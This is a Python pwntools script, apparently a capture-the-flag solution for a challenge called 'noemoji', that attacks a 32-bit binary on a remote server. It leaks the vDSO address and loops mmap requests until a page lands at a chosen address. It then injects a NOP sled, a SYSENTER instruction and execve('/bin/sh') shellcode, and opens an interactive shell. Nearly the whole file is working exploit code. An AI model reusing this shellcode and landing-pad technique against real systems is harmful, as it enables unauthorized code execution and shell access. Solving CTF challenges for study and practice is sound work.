#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys
import time

FILENAME = "./main"
LIBCNAME = ""

hosts = ("noemoji.hackable.software","localhost","localhost")
ports = (1337,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='i386')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(ch):
  global c
  c.recvuntil("cow beer\n")
  c.recvline()
  c.sendline(ch)

def horse(data):
  global c
  s = len(data)
  hoge('h')
  c.recvuntil("gib:\n")
  for i in range(s//0x20 + 1):
    try:
      c.send(data[i*0x20: (i+1)*0x20])
    except():
      return

def beer():
  global c
  hoge('b')
  c.recvuntil("@")
  return int(c.recvline().rstrip(), 16)

i = 0
j = 0

def cow():
  global c
  hoge('c')

## exploit ###########################################

def exploit():
  global c
  global i,j
  sym_int80_landing_pad = 0xb49

  # get vDSO addr
  c.recvuntil("[vvar]")
  c.recvline()
  vdso = int(c.recvuntil("-")[:-1], 16)
  print("[{}] vdso: ".format(hex(i))+hex(vdso))

  # check vDSO's 32bit is in range of mmap(0x0~0x1000000) [8bit entropy]
  # むぅ、なんかtarget>=0x400000だとうまくいかん気がするんだが
  #if(vdso & 0xFF000000 != 0):
  if(((vdso & (2**32 - 1))>>12) >= 0x300):
    return False
  target = vdso & (2**32 - 1)
  print("[!] YEAH. I can target: "+hex(target))

  # mmap until (vDSO+0xB49)&32bit is mapped [12bit entropy]
  j = 0
  while True:
    mmapaddr = beer()
    print("[{}] mmap: ".format(hex(j))+hex(mmapaddr))
    j += 1
    if mmapaddr == target:
      break

  # inject shellcode
  print("[!] injecting shellcode and SYSENTERing...")
  shellcode = b""
  shellcode += asm('mov esp, {}'.format(hex(mmapaddr + 0x200)))
  shellcode += asm('xor eax, eax')
  shellcode += asm('push 0x0068732f')
  shellcode += asm('push 0x6e69622f')
  shellcode += asm('mov ebx, esp')
  shellcode += asm('mov ecx, eax')
  shellcode += asm('mov edx, eax')
  shellcode += asm('mov al, 0xb')
  shellcode += asm('int 0x80')
  shellcode += asm('xor eax, eax')
  shellcode += asm('inc eax')
  shellcode += asm('int 0x80')
  pay = b""
  pay += p8(0x90) * 0x200
  pay += p8(0x0F) + p8(0x34) # SYSENTER
  pay += p8(0x90) * (0xe00 - len(pay))
  pay += shellcode
  pay += p8(0x90) * (0x1000 - len(pay))
  raw_input("ENTER TO PWN")
  horse(pay)

  return True



## main ##############################################

if __name__ == "__main__":
    global c
    global i
    start_time = time.time()

    
    while True:
      if len(sys.argv)>1:
        if sys.argv[1][0]=="d":
          cmd = """
            set follow-fork-mode parent
          """
          c = gdb.debug(FILENAME,cmd)
        elif sys.argv[1][0]=="r":
          c = remote(rhp1["host"],rhp1["port"])
        elif sys.argv[1][0]=="v":
          c = remote(rhp3["host"],rhp3["port"])
      else:
          c = remote(rhp2['host'],rhp2['port'])

      result = exploit()
      if result == False:
        c.close()
        i += 1
        continue

      break
    print("[!] Success pwning:")
    print("[+]   try of vSDO:  "+hex(i))
    print("[+]   try of mmap: "+hex(j))
    print("[+]   total time : " + str(time.time() - start_time) + "s")

    c.interactive()
